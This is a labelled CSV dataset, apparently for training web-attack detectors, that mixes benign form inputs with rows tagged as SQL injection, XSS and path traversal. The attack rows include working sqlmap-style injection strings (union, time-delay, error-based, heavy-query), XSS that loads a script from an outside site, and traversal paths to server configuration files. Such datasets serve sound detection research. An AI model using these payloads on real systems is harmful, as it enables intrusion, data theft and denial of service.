payload,length,attack_type,label
6485,4,norm,norm
"1 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",203,sqli,anom
correnta,8,norm,norm
"1' in boolean mode) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)#",110,sqli,anom
09580,5,norm,norm
6048168713695182,16,norm,norm
almoharn,8,norm,norm
"-1692') union all select 7074,7074,7074,7074,7074,7074,7074#",60,sqli,anom
cachopo pentenero,17,norm,norm
warwicke@discon.mm,18,norm,norm
-6100') as kvfc where 2377=2377 or 6872=6872--,46,sqli,anom
bruasewetter.astin6@locuraporno.int,35,norm,norm
"1',(select (case when (8596=8596) then 1 else 8596*(select 8596 from mysql.db) end))",84,sqli,anom
1pergamin0da,12,norm,norm
"1,(select (case when (8392=8404) then 1 else 8392*(select 8392 from information_schema.character_sets) end))",108,sqli,anom
"1""))) or 6793=(select 6793 from pg_sleep(5)) and (((""azmf""=""azmf",64,sqli,anom
ti2etana,8,norm,norm
?revivir,8,norm,norm
1) and 9198=9198--,18,sqli,anom
golpeadura,10,norm,norm
24244793x,9,norm,norm
"1"");select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""unju""=""unju",80,sqli,anom
"-6249'))) union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",73,sqli,anom
"calle gola de perellonet, 196,",30,norm,norm
76156835v,9,norm,norm
9054650550547446,16,norm,norm
"1"" or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",154,sqli,anom
1')) as txxn where 7884=7884 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,211,sqli,anom
4485457754707106,16,norm,norm
nuez de balboa 131 2-f,22,norm,norm
"-8454"" or 6872=6872",19,sqli,anom
9952193601744156,16,norm,norm
"c/ monardes 155,",16,norm,norm
tarrats steiert,15,norm,norm
"1"")) as qrok where 8257=8257 or 8421=(select count(*) from generate_series(1,5000000))--",88,sqli,anom
"1'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('pcim'='pcim",220,sqli,anom
3013,4,norm,norm
lamphier,8,norm,norm
esmilcea,8,norm,norm
-4262%'))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'=',225,sqli,anom
cristie,7,norm,norm
61,2,norm,norm
"1'+(select basp where 6953=6953;iif(5257=5257,1,1/0)",52,sqli,anom
0600142480531797,16,norm,norm
calle clavel 30 11?b,20,norm,norm
trese,5,norm,norm
31152,5,norm,norm
-7231)) union all select 7639#,30,sqli,anom
"1%"") waitfor delay '0:0:5' and (""%""=""",37,sqli,anom
40145,5,norm,norm
"1"")) as daqd where 4390=4390 and elt(3114=3114,sleep(5))#",57,sqli,anom
c/ moriles 91,13,norm,norm
write(1) autofocus>,19,xss,anom
"1)) as gygm where 4024=4024;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",88,sqli,anom
nava,4,norm,norm
87053274e,9,norm,norm
10560589r,9,norm,norm
al9ol,5,norm,norm
4698577318753037,16,norm,norm
"1%') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('%'='",111,sqli,anom
vai gala,8,norm,norm
"1'||(select 'nfgq' where 1837=1837 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",175,sqli,anom
"1"" where 3018=3018 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",94,sqli,anom
fermn,5,norm,norm
"1"")) as chal where 6661=6661;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",129,sqli,anom
16359311d,9,norm,norm
1'+(select 'hhnz' where 2465=2465;select (case when (3537=5218) then 3537 else 3537*(select 3537 from mysql.db) end)#,117,sqli,anom
c/ maria de padilla 5 12a,25,norm,norm
seno,4,norm,norm
1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('uwbt' like 'uwbt,207,sqli,anom
"1%"";select benchmark(5000000,md5(0x4c4d6142)) and ""%""=""",55,sqli,anom
"1%"")));select benchmark(5000000,md5(0x714e4153))#",49,sqli,anom
"rinconada de la sierra, la",26,norm,norm
"el naranjo, s/n 5f",18,norm,norm
"-2394') union all select 1650,1650,1650,1650,1650,1650,1650--",61,sqli,anom
"-5989%"" union all select 3581,3581,3581,3581,3581--",51,sqli,anom
"1) as mwcs where 2544=2544 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",131,sqli,anom
regencs,7,norm,norm
"-4653' or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",137,sqli,anom
1')) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('jryo'='jryo,222,sqli,anom
"1'))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((('ccqs'='ccqs",114,sqli,anom
1'+(select zmbu where 8685=8685 rlike (select (case when (7689=7689) then 1 else 0x28 end)))+',94,sqli,anom
"1'+(select 'asdq' where 4023=4023 and make_set(8403=8403,8899))+'",65,sqli,anom
9955615288852463,16,norm,norm
"isla de nelson, 89 7?h",22,norm,norm
"1%' union all select null,null,null,null,null,null,null,null#",61,sqli,anom
1' where 6116=6116;select (case when (7033=1594) then 7033 else 7033*(select 7033 from information_schema.character_sets) end)#,127,sqli,anom
75106972n,9,norm,norm
chmara@novolardiseno.ky,23,norm,norm
vanera,6,norm,norm
drayton,7,norm,norm
c/ costa i llobera 83,21,norm,norm
"-4168') union all select 2618,2618#",35,sqli,anom
vetrie,6,norm,norm
vivaldo,7,norm,norm
"-4121%"") union all select 2659,2659,2659,2659,2659,2659,2659,2659--",67,sqli,anom
"1%"")))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((""%""=""",216,sqli,anom
bellcaire d'urgell,18,norm,norm
"-4285'))) union all select 8819,8819,8819,8819,8819,8819,8819,8819#",67,sqli,anom
bufali,6,norm,norm
"1%') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('%'='",216,sqli,anom
alegrante,9,norm,norm
bi-jun,6,norm,norm
"1')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('fowu' like 'fowu",134,sqli,anom
carraspeo,9,norm,norm
buenda,6,norm,norm
toperzer1,9,norm,norm
1)) as qsos where 2721=2721 rlike (select * from (select(sleep(5)))sgvo)--,74,sqli,anom
"<object classid=clsid:..."" codebase=""javascript:alert('xss');"">",63,xss,anom
"c/ florida, 61 4?c",18,norm,norm
tyler,5,norm,norm
gaviota 13,10,norm,norm
"c/ arquitecto hernandez rubio, 101, 1h",38,norm,norm
"1')) or 8421=(select count(*) from generate_series(1,5000000)) and (('qgov'='qgov",81,sqli,anom
davids,6,norm,norm
1')) or sleep(5)#,17,sqli,anom
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('wmrr' like 'wmrr",120,sqli,anom
francino llosa,14,norm,norm
beas de segura,14,norm,norm
"1"");select sleep(5)#",20,sqli,anom
albertina,9,norm,norm
"1"")) as xtlt where 9293=9293;select case when 7717=7717 then 1 else null end--",78,sqli,anom
"1""))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (((""yxpo"" like ""yxpo",119,sqli,anom
24142,5,norm,norm
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ('tetk'='tetk",110,sqli,anom
belmondo@artesania.org.ci,25,norm,norm
bertolda,8,norm,norm
"1')) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",99,sqli,anom
carlie,6,norm,norm
40162,5,norm,norm
blisse,6,norm,norm
1)) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((7594=7594,200,sqli,anom
"pl. los oficios, 181 12?d",25,norm,norm
-7565%') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'=',199,sqli,anom
16522,5,norm,norm
"-1816"") or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""dztr"" like ""dztr",225,sqli,anom
4ino57l,7,norm,norm
"1"") where 5491=5491;begin user_lock.sleep(5); end--",51,sqli,anom
-6129) as vuze where 1565=1565 or (8459=8459)*4906--,52,sqli,anom
09640,5,norm,norm
co85863o,8,norm,norm
"-9286"")) as mfxl where 9348=9348 union all select 9348#",55,sqli,anom
15953,5,norm,norm
"1"") as zhlf where 4119=4119 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",125,sqli,anom
48573885r,9,norm,norm
tottenham@satellites.py,23,norm,norm
truswell@soybueno.be,20,norm,norm
armaanzas,9,norm,norm
4673726880012931,16,norm,norm
"1%""))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",104,sqli,anom
4970113242543246,16,norm,norm
"1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('gtcb'='gtcb",124,sqli,anom
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('btnl'='btnl",113,sqli,anom
8715,4,norm,norm
"carrer carrasca 19, 4-c",23,norm,norm
7647479172246248,16,norm,norm
1');select (case when (7217=7631) then 7217 else 7217*(select 7217 from information_schema.character_sets) end)#,112,sqli,anom
kedah,5,norm,norm
1) as rqac where 3381=3381 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,122,sqli,anom
1') and (select * from (select(sleep(5)))fzno) and ('mqoj' like 'mqoj,69,sqli,anom
janda,5,norm,norm
847,3,norm,norm
"1"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",93,sqli,anom
"1%'))) or 8466=benchmark(5000000,md5(0x694a4745)) and ((('%'='",62,sqli,anom
melucci,7,norm,norm
macoosh3,8,norm,norm
llanera,7,norm,norm
"mesas, las",10,norm,norm
"1' or elt(6272=6272,sleep(5)) and 'fvtf' like 'fvtf",51,sqli,anom
cal,3,norm,norm
combos,6,norm,norm
kri!sti,7,norm,norm
"calle da unidade, 184 7e",24,norm,norm
"1"" where 9804=9804 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",156,sqli,anom
7099741162484696,16,norm,norm
benigni@viajesdacapalla.pa,26,norm,norm
lehar,5,norm,norm
"1""))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""htyi""=""htyi",164,sqli,anom
/........................................................................../../../../{file},91,path-traversal,anom
colobran rebull,15,norm,norm
brewton,7,norm,norm
1') as dqgr where 2427=2427 and (3020=3020)*6703--,50,sqli,anom
/...............{file},22,path-traversal,anom
keely4,6,norm,norm
"1';select count(*) from generate_series(1,5000000) and 'fahy' like 'fahy",72,sqli,anom
"1"" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ""ygzq"" like ""ygzq",116,sqli,anom
-8341 or 8571=8571--,20,sqli,anom
mauricio,8,norm,norm
"entrada el zurdo, 166 7?e",25,norm,norm
"1) where 7775=7775 union all select null,null,null,null--",57,sqli,anom
7395,4,norm,norm
"calle moreria 190, 10?a",23,norm,norm
7964537114213279,16,norm,norm
"1%"");select count(*) from generate_series(1,5000000) and (""%""=""",63,sqli,anom
sabu35so,8,norm,norm
allariz,7,norm,norm
1423186093193887,16,norm,norm
es93n576te,10,norm,norm
2955362833372766,16,norm,norm
9140660684303193,16,norm,norm
"1'||(select 'ymwf' where 1229=1229 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null))||'",142,sqli,anom
0lica,5,norm,norm
oda,3,norm,norm
9473535060757439,16,norm,norm
tarp@redstarz.asia,18,norm,norm
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('vgkt'='vgkt",115,sqli,anom
475t38la,8,norm,norm
"calle jazmin, s/n, 9-d",22,norm,norm
-5217 where 3620=3620 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,209,sqli,anom
"1) union all select null,null,null,null,null,null--",51,sqli,anom
autonell,8,norm,norm
-4582)) as gvfo where 8885=8885 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,264,sqli,anom
dugas,5,norm,norm
48394,5,norm,norm
"1';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'tmdj' like 'tmdj",123,sqli,anom
9639,4,norm,norm
49779839l,9,norm,norm
(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4501=4501) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual),222,sqli,anom
mcmanus,7,norm,norm
"-1030"" where 2161=2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",91,sqli,anom
1';begin user_lock.sleep(5); end and 'hizd'='hizd,49,sqli,anom
0445247977004873,16,norm,norm
94335965q,9,norm,norm
7115660202719431,16,norm,norm
33120,5,norm,norm
"1"") waitfor delay '0:0:5' and (""hhzy"" like ""hhzy",48,sqli,anom
hermine@943.mw,14,norm,norm
"1"" and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",101,sqli,anom
2isopada,8,norm,norm
mariele,7,norm,norm
"1));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((4142=4142",85,sqli,anom
"1 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",108,sqli,anom
"1' and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",155,sqli,anom
1)) rlike (select (case when (6113=1222) then 1 else 0x28 end)) and ((2815=2815,79,sqli,anom
"1'+(select jley where 3581=3581 and 2388=benchmark(5000000,md5(0x6d457153))#",76,sqli,anom
youji,5,norm,norm
"calle aljarafe, 161 13?b",24,norm,norm
39806,5,norm,norm
chabert,7,norm,norm
1%')) and 6969=(select 6969 from pg_sleep(5)) and (('%'=',57,sqli,anom
"1%' union all select null,null,null,null,null,null,null,null,null,null#",71,sqli,anom
1%')));select pg_sleep(5) and ((('%'=',38,sqli,anom
irado,5,norm,norm
prouty@gnuez.zw,15,norm,norm
"-2321%"") or 2271=7683--",23,sqli,anom
"1'+(select 'kqnj' where 9483=9483 or elt(5873=5873,sleep(5))#",61,sqli,anom
czarevitz,9,norm,norm
"1"")) as brwj where 9180=9180;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",122,sqli,anom
3900278592647415,16,norm,norm
"jose gomez gallito, 107,",24,norm,norm
paracuellos de jarama,21,norm,norm
4e6qu5r5r,9,norm,norm
desaplomar,10,norm,norm
5130,4,norm,norm
"1 where 5099=5099 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",93,sqli,anom
"moncayo 46,",11,norm,norm
"-2790') as xhct where 5756=5756 union all select 5756,5756#",59,sqli,anom
1 where 7464=7464 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,79,sqli,anom
komarov@docerosas.dk,20,norm,norm
1'))) union all select null#,28,sqli,anom
"calle almonte 68, 5?g",21,norm,norm
/..//..//..//{file},19,path-traversal,anom
0551226371339052,16,norm,norm
96815806c,9,norm,norm
mallo etchart,13,norm,norm
"-1748%""))) union all select 2987#",33,sqli,anom
xe2foba,7,norm,norm
amenta,6,norm,norm
hennon,6,norm,norm
1) or sleep(5)#,15,sqli,anom
9365263775235809,16,norm,norm
arrafiz,7,norm,norm
agn,3,norm,norm
arxe matsumiya,14,norm,norm
"1)) as rcon where 8190=8190 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",125,sqli,anom
"1' where 3612=3612 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",191,sqli,anom
"1""))) and 7153=7474--",21,sqli,anom
solares,7,norm,norm
"1"");begin dbms_lock.sleep(5); end and (""qkkn"" like ""qkkn",56,sqli,anom
"1',(select (case when (3888=3888) then (select count(*) from generate_series(1,5000000)) else 1/(select 0) end))",112,sqli,anom
037r20n0do,10,norm,norm
pedrosa de ro rbel,18,norm,norm
"calle hospital, 68",18,norm,norm
1) where 6884=6884 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,201,sqli,anom
"1')) and 3824=benchmark(5000000,md5(0x76555642)) and (('bemh'='bemh",67,sqli,anom
$embrutecimiento,16,norm,norm
"c/ hortensia 48,",16,norm,norm
1'))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((('vtoi' like 'vtoi,90,sqli,anom
"1);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",99,sqli,anom
-7971' union all select 4273#,29,sqli,anom
50830,5,norm,norm
matsuda.agay@estaestuweb.com.bu,31,norm,norm
"<iframe/src=""data:text/html; base64 ,pgjvzhkgb25sb2fkpwfszxj0kdeppg=="">",71,xss,anom
pugliesi boleda,15,norm,norm
1';select (case when (1093=7693) then 1093 else 1/(select 0) end)--,67,sqli,anom
92frico,7,norm,norm
"terque 135, 7-c",15,norm,norm
">""scriptdocument.cookie=true;/script",36,xss,anom
49280,5,norm,norm
1'||(select 'tznb' from dual where 8808=8808 rlike (select * from (select(sleep(5)))vwyq)#,90,sqli,anom
"-7240')) union all select 8064,8064,8064#",41,sqli,anom
"-3361'||(select 'msfi' where 4806=4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",102,sqli,anom
1);waitfor delay '0:0:5'--,26,sqli,anom
furnari pentinat,16,norm,norm
87337571q,9,norm,norm
50678,5,norm,norm
1') as xiqw where 8507=8507 rlike sleep(5)--,44,sqli,anom
0250216835204033,16,norm,norm
acimentarse,11,norm,norm
"1')) as nxhp where 2649=2649 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",123,sqli,anom
"calle francisco monje, 94 13-d",30,norm,norm
6538,4,norm,norm
ponsati puratic,15,norm,norm
"calle la corta, 85",18,norm,norm
chiykows,8,norm,norm
"1) as cfnz where 6065=6065 union all select null,null,null,null,null,null,null,null,null#",89,sqli,anom
23550240b,9,norm,norm
"-1055"" or (8459=8459)*4906 and ""kdbr""=""kdbr",43,sqli,anom
despuig,7,norm,norm
"-2909'||(select 'qfeq' where 7062=7062 union all select 7062,7062,7062,7062,7062,7062--",87,sqli,anom
1 where 2672=2672 and 1819=4322#,32,sqli,anom
50236,5,norm,norm
filomena,8,norm,norm
"c/ de puigcerda s/n, 1-g",24,norm,norm
mostazal,8,norm,norm
"1') and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('xikz' like 'xikz",87,sqli,anom
revill5,7,norm,norm
"1') where 8167=8167;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",111,sqli,anom
aizpuru cerusoli,16,norm,norm
28221877a,9,norm,norm
"font d'en canyelles 21, 1-b",27,norm,norm
1'+(select nash where 4159=4159 union all select null#,54,sqli,anom
1;waitfor delay '0:0:5'-- thuo,30,sqli,anom
oliva,5,norm,norm
bedon merlach,13,norm,norm
"-4095') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",138,sqli,anom
"1%';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",88,sqli,anom
0208625948650928,16,norm,norm
"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",75,sqli,anom
"1'+(select hkrg where 3665=3665;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",122,sqli,anom
nentwich,8,norm,norm
10131,5,norm,norm
hi28ome458a,11,norm,norm
free,4,norm,norm
4881,4,norm,norm
"1')) as gqzy where 2312=2312 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",126,sqli,anom
sayara,6,norm,norm
sant esteve de la sarga,23,norm,norm
rhys,4,norm,norm
"c/ fancelli, 34 6b",18,norm,norm
1' in boolean mode) rlike (select (case when (7689=7689) then 1 else 0x28 end))#,80,sqli,anom
-6179)) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((7732=7732,209,sqli,anom
zylstra,7,norm,norm
cantbrico,9,norm,norm
-7951'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('blak'='blak,209,sqli,anom
40133,5,norm,norm
45212,5,norm,norm
somer@hotelsardegna.tg,22,norm,norm
romaguer,8,norm,norm
villar de la encina,19,norm,norm
9593063856723966,16,norm,norm
09312,5,norm,norm
41457,5,norm,norm
7137970068268248,16,norm,norm
llanderal campos,16,norm,norm
' or '1' = '1,13,sqli,anom
michael,7,norm,norm
millares,8,norm,norm
"1' where 8360=8360 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",94,sqli,anom
x:expression8write(1)9>,23,xss,anom
empeine,7,norm,norm
sincr5nica,10,norm,norm
tes6a485n,9,norm,norm
sotalbo,7,norm,norm
d:inetpubwwwrootglobal.asa,26,path-traversal,anom
4906,4,norm,norm
"moreno lopez, 55, 9-e",21,norm,norm
1%' rlike sleep(5)#,19,sqli,anom
34859412z,9,norm,norm
gelde pajares,13,norm,norm
concluir,8,norm,norm
1' where 8231=8231;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,116,sqli,anom
6343513594517926,16,norm,norm
"1) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (9112=9112",77,sqli,anom
1';select sleep(5)#,19,sqli,anom
ritz@hipergipuzkoa.pa,21,norm,norm
remington,9,norm,norm
visionario,10,norm,norm
"<meta http-equiv=""refresh"" content=""0;url=data:text/html;base64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k"">",106,xss,anom
1')));(select * from (select(sleep(5)))acdk)#,45,sqli,anom
1%'))) and 2444=9282#,21,sqli,anom
ido,3,norm,norm
1%' or 4240=(select 4240 from pg_sleep(5))--,44,sqli,anom
nancy,5,norm,norm
1') where 8707=8707 and 3210=1477--,35,sqli,anom
couri-manahan@copiar.com.fm,27,norm,norm
attilio,7,norm,norm
av. del mar cantabrico 176 6-d,30,norm,norm
1')) and 3526=1354,18,sqli,anom
01498780p,9,norm,norm
dieciseisavo,12,norm,norm
"1')) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (('sucj'='sucj",224,sqli,anom
"-5181""))) or elt(1032=1032,3623) and (((""qofp""=""qofp",52,sqli,anom
/../../../../web-inf/web.xml,28,path-traversal,anom
/../../../../../../../../{file},31,path-traversal,anom
marieau8@clementelr.nz,22,norm,norm
<script src=http://vulnerability-lab.com/crosssitescripting.js></script>,72,xss,anom
casabermeja,11,norm,norm
09840824k,9,norm,norm
-5580 or 4829=1968,18,sqli,anom
9202478257950133,16,norm,norm
"1' where 2025=2025 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",126,sqli,anom
cele959n3s0o,12,norm,norm
garda,5,norm,norm
magriny,7,norm,norm
pujolaso faucheux,17,norm,norm
37167690n,9,norm,norm
10421521z,9,norm,norm
incisivo,8,norm,norm
adjani@zoorapia.ma,18,norm,norm
nickonov,8,norm,norm
fong,4,norm,norm
artica,6,norm,norm
1') and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),206,sqli,anom
rojo sarri,10,norm,norm
8087,4,norm,norm
"c/ zamora, 151, 1-b",19,norm,norm
"1)));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",89,sqli,anom
-3462')) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('cxku' like 'cxku,230,sqli,anom
saro,4,norm,norm
recital,7,norm,norm
"-6108') union all select 2519,2519,2519,2519--",46,sqli,anom
-8248 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq'),98,sqli,anom
salmern grenett,15,norm,norm
alfafara,8,norm,norm
potroso,7,norm,norm
lamm lodeiro,12,norm,norm
calamocha,9,norm,norm
"-5058%' union all select 6789,6789,6789,6789,6789#",50,sqli,anom
cristbal,8,norm,norm
"montmell, el",12,norm,norm
manchita,8,norm,norm
"-7580')) as mmqt where 3468=3468 union all select 3468,3468,3468,3468,3468,3468#",80,sqli,anom
"1';select benchmark(5000000,md5(0x4c4d6142)) and 'gfpd'='gfpd",61,sqli,anom
1228688038789321,16,norm,norm
"1') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('pmzp' like 'pmzp",116,sqli,anom
"valencia, 79 12?h",17,norm,norm
6317858667918423,16,norm,norm
rosic@faders.com.sn,19,norm,norm
"1')) as fwhv where 3921=3921 union all select null,null--",57,sqli,anom
